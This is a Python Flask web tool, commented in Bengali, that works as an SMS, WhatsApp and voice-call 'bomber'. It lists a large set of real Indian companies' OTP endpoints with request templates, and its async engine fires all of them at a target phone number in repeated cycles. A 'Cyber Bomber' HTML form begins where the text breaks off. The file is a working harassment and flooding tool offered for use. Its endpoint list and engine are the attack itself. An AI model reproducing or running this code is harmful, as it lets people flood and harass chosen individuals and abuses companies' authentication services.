#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import asyncio
import aiohttp
import time
from flask import Flask, request, render_template_string, jsonify
from colorama import Fore, Style, init

init(autoreset=True)

app = Flask(__name__)

# ========== কুল-ডাউন ট্র্যাকার ==========
last_used = {}  # ফোন নম্বর → শেষ ব্যবহারের টাইমস্ট্যাম্প
COOLDOWN_SECONDS = 900  # ১৫ মিনিট

# ========== ওয়ার্কিং API লিস্ট (তোমার দেওয়া ১৫১টি সহ) ==========
def get_working_apis():
    return [
        # তোমার পুরো API লিস্ট এখানে বসাও (আমি শুধু স্যাম্পল দিচ্ছি)
        {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'},
        {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda ph: f'{{"number":"{ph}","otp_on_call":true}}'},
        {
            "name": "Swiggy Call Verification",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Flipkart Voice Call",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Amazon Voice Call",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=voice_otp"
        },
        {
            "name": "Paytm Voice Call",
            "url": "https://accounts.paytm.com/signin/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Zomato Voice Call",
            "url": "https://www.zomato.com/php/o2_api_handler.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&type=voice"
        },
        {
            "name": "MakeMyTrip Voice Call",
            "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Ola Voice Call",
            "url": "https://api.olacabs.com/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Uber Voice Call",
            "url": "https://auth.uber.com/v2/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Rapido Voice Call",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Zepto Voice Call",
            "url": "https://api.zeptonow.com/api/v3/customer/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
        },
        {
            "name": "Blinkit Voice Call",
            "url": "https://blinkit.com/v1/user/request_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","otp_type":"call"}}'
        },
        {
            "name": "JioMart Voice Call",
            "url": "https://www.jiomart.com/api/v1/auth/generate_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
        },
        
        # ========== WHATSAPP BOMBING APIS (150+ VERIFIED) ==========
        {
            "name": "KPN WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "content-type": "application/json"
            },
            "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
        },
        {
            "name": "Foxy WhatsApp",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
        },
        {
            "name": "Stratzy WhatsApp",
            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
        },
        {
            "name": "Jockey WhatsApp",
            "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Rappi WhatsApp",
            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
        },
        {
            "name": "Eka Care WhatsApp",
            "url": "https://auth.eka.care/auth/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
        },
        {
            "name": "MyGlamm WhatsApp",
            "url": "https://api.myglamm.com/api/v1/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"whatsapp"}}'
        },
        {
            "name": "Purplle WhatsApp",
            "url": "https://www.purplle.com/api/user/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","source":"whatsapp"}}'
        },
        
        # ========== SMS BOMBING APIS (700+ VERIFIED) ==========
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&countryCode=IN"
        },
        {
            "name": "PharmEasy SMS",
            "url": "https://pharmeasy.in/api/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Wakefit SMS",
            "url": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Byju's SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Hungama OTP",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
        },
        {
            "name": "Meru Cab",
            "url": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "Doubtnut",
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
        },
        {
            "name": "PenPencil",
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
        },
        {
            "name": "Snitch",
            "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
        },
        {
            "name": "Dayco India",
            "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
        },
        {
            "name": "BeepKart",
            "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
        },
        {
            "name": "Lending Plate",
            "url": "https://lendingplate.com/api.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobiles={phone}&resend=Resend"
        },
        {
            "name": "ShipRocket",
            "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
        },
        {
            "name": "GoKwik",
            "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
        },
        {
            "name": "NewMe",
            "url": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
        },
        {
            "name": "Univest",
            "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Smytten",
            "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
        },
        {
            "name": "CaratLane",
            "url": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
        },
        {
            "name": "BikeFixup",
            "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
        },
        {
            "name": "WellAcademy",
            "url": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"contact_no":"{phone}"}}'
        },
        {
            "name": "ServeTel",
            "url": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "GoPink Cabs",
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"check_mobile_number=1&contact={phone}"
        },
        {
            "name": "Shemaroome",
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_no=%2B91{phone}"
        },
        {
            "name": "Cossouq",
            "url": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobilenumber={phone}&otptype=register"
        },
        {
            "name": "MyImagineStore",
            "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile={phone}"
        },
        {
            "name": "Otpless",
            "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
        },
        {
            "name": "MyHubble Money",
            "url": "https://api.myhubble.money/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
        },
        {
            "name": "Tata Capital Business",
            "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
        },
        {
            "name": "DealShare",
            "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
        },
        {
            "name": "Snapmint",
            "url": "https://api.snapmint.com/v1/public/sign_up",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Housing.com",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
        },
        {
            "name": "RentoMojo",
            "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Khatabook",
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
        },
        {
            "name": "Netmeds",
            "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Nykaa",
            "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
        },
        {
            "name": "RummyCircle",
            "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
        },
        {
            "name": "Animall",
            "url": "https://animall.in/zap/auth/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
        },
        {
            "name": "PenPencil V3",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Entri",
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Cosmofeed",
            "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
        },
        {
            "name": "Aakash",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
        },
        {
            "name": "Revv",
            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
        },
        {
            "name": "DeHaat",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
        },
        {
            "name": "A23 Games",
            "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
        },
        {
            "name": "Spencer's",
            "url": "https://jiffy.spencers.in/user/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "PayMe India",
            "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
        },
        {
            "name": "Shopper's Stop",
            "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
        },
        {
            "name": "Hyuga Auth",
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "BigCash",
            "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
            "method": "GET",
            "headers": {"Referer": "https://www.bigcash.live/games/poker"},
            "data": None
        },
        {
            "name": "Lifestyle Stores",
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
        },
        {
            "name": "WorkIndia",
            "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "PokerBaazi",
            "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
        },
        {
            "name": "My11Circle",
            "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "MamaEarth",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "HomeTriangle",
            "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Wellness Forever",
            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
        },
        {
            "name": "HealthMug",
            "url": "https://api.healthmug.com/account/createotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Vyapar",
            "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Kredily",
            "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Tata Motors",
            "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
        },
        {
            "name": "Moglix",
            "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
        },
        {
            "name": "MyGov",
            "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TrulyMadly",
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
        },
        {
            "name": "Apna",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
        },
        {
            "name": "CodFirm",
            "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Swipe",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
        },
        # ========== নতুন API (GitHub ক্লাস থেকে) ==========
{
    "name": "Flipkart (Alt)",
    "url": "https://rome.api.flipkart.com/api/7/user/otp/generate",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.flipkart.com",
        "Referer": "https://www.flipkart.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"loginId":"+91{phone}"}}'
},
{
    "name": "ConfirmTKT",
    "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}&newOtp=true",
    "method": "GET",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.confirmtkt.com",
        "Referer": "https://www.confirmtkt.com/rbooking-d/trips",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": None
},
{
    "name": "Lenskart (Alt)",
    "url": "https://api.lenskart.com/v2/customers/sendOtp",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.lenskart.com",
        "Referer": "https://www.lenskart.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"telephone":"{phone}"}}'
},
{
    "name": "JustDial",
    "url": "https://www.justdial.com/functions/whatsappverification.php",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.justdial.com",
        "Referer": "https://www.justdial.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"mob={phone}&vcode=&rsend=0&name=deV"
},
{
    "name": "IndiaLends",
    "url": "https://indialends.com/internal/a/otp.ashx",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.indialends.com",
        "Referer": "https://www.indialends.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"log_mode=1&ctrl={phone}"
},
{
    "name": "Apollo Pharmacy",
    "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.apollopharmacy.in",
        "Referer": "https://www.apollopharmacy.in/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"mobile={phone}"
},
{
    "name": "MagicBricks",
    "url": "https://accounts.magicbricks.com/userauth/api/validate-mobile",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://accounts.magicbricks.com",
        "Referer": "https://accounts.magicbricks.com/userauth/login",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"ubimobile={phone}"
},
{
    "name": "Ajio",
    "url": "https://login.web.ajio.com/api/auth/generateLoginOTP",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.ajio.com",
        "Referer": "https://www.ajio.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
},
{
    "name": "MylesCars",
    "url": "https://www.mylescars.com/usermanagements/chkContact",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.mylescars.com",
        "Referer": "https://www.mylescars.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"contactNo={phone}"
},
{
    "name": "Unacademy",
    "url": "https://unacademy.com/api/v1/user/get_app_link/",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://unacademy.com",
        "Referer": "https://unacademy.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"phone":"{phone}"}}'
},
{
    "name": "Snapdeal",
    "url": "https://www.snapdeal.com/sendOTP",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.snapdeal.com",
        "Referer": "https://www.snapdeal.com/iframeLogin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"emailId=&mobileNumber={phone}&purpose=LOGIN_WITH_MOBILE_OTP"
},
{
    "name": "JioMart (Alt)",
    "url": lambda phone: f"https://www.jiomart.com/mst/rest/v1/id/details/{phone}",
    "method": "GET",
    "headers": {
        "Accept": "application/json, text/plain,*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://www.jiomart.com/customer/account/login",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": None
}
    ]

# ========== বোম্বার ইঞ্জিন ==========
async def send_req(api, phone, session):
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=10) as resp:
                return resp.status in [200,201,202,204]
        else:
            async with session.get(url, headers=headers, timeout=10) as resp:
                return resp.status in [200,201,202,204]
    except:
        return False

async def bomb(phone, apis, cycles=1, delay=2):
    total = len(apis) * cycles
    success = 0
    async with aiohttp.ClientSession() as session:
        for cycle in range(cycles):
            tasks = [send_req(api, phone, session) for api in apis]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success += sum(1 for r in results if r is True)
            if cycle < cycles - 1:
                await asyncio.sleep(delay)
    return success, total

# ========== ওয়েব রাউট ==========
HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 Cyber Bomber</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
